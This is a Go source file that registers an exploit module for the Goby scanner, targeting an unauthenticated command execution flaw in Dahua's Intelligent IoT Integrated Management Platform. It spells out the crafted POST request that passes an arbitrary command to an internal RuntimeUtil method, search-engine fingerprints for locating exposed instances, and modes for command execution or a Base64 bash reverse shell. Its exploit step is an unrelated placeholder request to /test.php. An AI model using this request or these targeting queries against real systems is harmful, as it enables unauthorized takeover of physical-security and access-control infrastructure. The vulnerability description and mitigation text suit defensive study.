package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "Dahua Intelligent IoT Integrated Management Platform /evo-apigw/admin/API/Developer/GetClassValue.jsp Command Execution Vulnerability",
    "Description": "<p>Dahua Intelligent IoT Integrated Management Platform is a foundational software integrating multiple business management functions, widely used in smart parks and commercial complexes. The platform integrates Dahua's expertise in security and intelligent technologies, combining video, access control, alarms, parking, attendance, visitor management, and video intercom subsystems into a comprehensive, efficient, open, flexible, and customizable platform software product. The GetClassValue.jsp interface of this platform has a remote code execution vulnerability. Unauthenticated attackers can send specially crafted requests through this interface to remotely execute arbitrary commands, gain system privileges, and potentially cause severe consequences such as sensitive information leakage and complete system takeover.</p>",
    "Product": "Dahua Intelligent IoT Integrated Management Platform",
    "Homepage": "https://www.dahuatech.com/",
    "DisclosureDate": "2025-01-02",
    "PostTime": "2025-01-06",
    "Author": "1251220046@qq.com",
    "FofaQuery": "body=\"/static/qwebchannel.js\" && body=\"location.hash.indexOf('/authLogin')\"",
    "GobyQuery": "body=\"/static/qwebchannel.js\" && body=\"location.hash.indexOf('/authLogin')\"",
    "Level": "2",
    "Impact": "<p>The GetClassValue.jsp interface has a remote code execution vulnerability, allowing attackers to remotely execute arbitrary commands, gain system privileges, and potentially cause severe consequences such as sensitive information leakage and complete system takeover.</p>",
    "Recommendation": "<p>1. Disable related services exposed to the Internet or configure interface access permissions.</p><p>2. Upgrade the system to the secure version provided by the vendor.</p>",
    "References": [
        "https://axsec.blog.csdn.net/article/details/144892794?spm=1001.2014.3001.5502"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "Mode",
            "type": "select",
            "value": "Command,Reverse",
            "show": ""
        },
        {
            "name": "Command",
            "type": "input",
            "value": "whoami",
            "show": "Mode=Command"
        },
        {
            "name": "Reverse",
            "type": "select",
            "value": "ByBashBase64",
            "show": "Mode=Reverse"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/evo-apigw/admin/API/Developer/GetClassValue.jsp",
                "follow_redirect": true,
                "header": {
                    "Content-Type": "application/json",
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv133.0) Gecko/20100101 Firefox/133.0"
                },
                "data_type": "text",
                "data": "{\r\n  \"data\": {\r\n    \"clazzName\": \"com.dahua.admin.util.RuntimeUtil\",\r\n    \"methodName\": \"syncexecReturnInputStream\",\r\n    \"fieldName\": [\"{{{COMMAND}}}\"]\r\n  }\r\n}"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Command Execution"
    ],
    "VulType": [
        "Command Execution"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "9.5",
    "Translation": {
        "CN": {
            "Name": "大华智能物联综合管理平台 /evo-apigw/admin/API/Developer/GetClassValue.jsp 命令执行漏洞",
            "Product": "大华智能物联综合管理平台",
            "Description": "<p>大华智能物联综合管理平台是一款集成多项业务管理功能的智能物联基础软件，广泛应用于智能园区和商业综合体等场景。该平台通过融合大华在安防和智能化领域的专业经验和前沿技术，集成视频、门禁、报警、停车场、考勤、访客、可视对讲等多个业务子系统，为客户提供一套集成、高效、开放、灵活可扩展、可定制的平台软件产品。该平台的GetClassValue.jsp接口存在远程代码执行漏洞，未经身份验证的攻击者可以通过该接口发送特制请求，远程执行任意命令，获取系统权限，可能导致敏感信息泄露、系统被完全控制等严重后果。</p>",
            "Recommendation": "<p>1. 关闭暴露在互联网的相关服务接口或设置接口访问权限。</p><p>2. 升级系统至厂商提供的安全版本。</p>",
            "Impact": "<p>GetClassValue.jsp接口存在远程代码执行漏洞，攻击者可利用该漏洞远程执行任意命令，获取系统权限，可能导致敏感信息泄露、系统被完全控制等严重后果。</p>",
            "VulType": [
                "命令执行"
            ],
            "Tags": [
                "命令执行"
            ]
        },
        "EN": {
            "Name": "Dahua Intelligent IoT Integrated Management Platform /evo-apigw/admin/API/Developer/GetClassValue.jsp Command Execution Vulnerability",
            "Product": "Dahua Intelligent IoT Integrated Management Platform",
            "Description": "<p>Dahua Intelligent IoT Integrated Management Platform is a foundational software integrating multiple business management functions, widely used in smart parks and commercial complexes. The platform integrates Dahua's expertise in security and intelligent technologies, combining video, access control, alarms, parking, attendance, visitor management, and video intercom subsystems into a comprehensive, efficient, open, flexible, and customizable platform software product. The GetClassValue.jsp interface of this platform has a remote code execution vulnerability. Unauthenticated attackers can send specially crafted requests through this interface to remotely execute arbitrary commands, gain system privileges, and potentially cause severe consequences such as sensitive information leakage and complete system takeover.</p>",
            "Recommendation": "<p>1. Disable related services exposed to the Internet or configure interface access permissions.</p><p>2. Upgrade the system to the secure version provided by the vendor.</p>",
            "Impact": "<p>The GetClassValue.jsp interface has a remote code execution vulnerability, allowing attackers to remotely execute arbitrary commands, gain system privileges, and potentially cause severe consequences such as sensitive information leakage and complete system takeover.</p>",
            "VulType": [
                "Command Execution"
            ],
            "Tags": [
                "Command Execution"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Variables": {
        "TEMPLATE": "define|variable|CommandExecEcho",
        "COMMAND": "COMMAND|variable|COMMAND",
        "VUL_URL": "define|variable|/evo-apigw/admin/API/Developer/GetClassValue.jsp"
    },
    "VariablesOrder": [
        "TEMPLATE",
        "COMMAND",
        "VUL_URL"
    ],
    "EditType": "fast",
    "PocId": "9982"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}